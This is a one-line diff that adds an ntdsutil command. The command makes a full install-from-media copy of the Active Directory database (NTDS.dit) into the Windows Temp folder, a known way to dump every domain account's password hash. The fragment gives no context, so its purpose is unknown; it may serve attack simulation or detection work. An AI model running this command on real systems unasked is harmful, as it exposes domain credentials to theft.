@@ -1,0 +1,1 @@
+ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
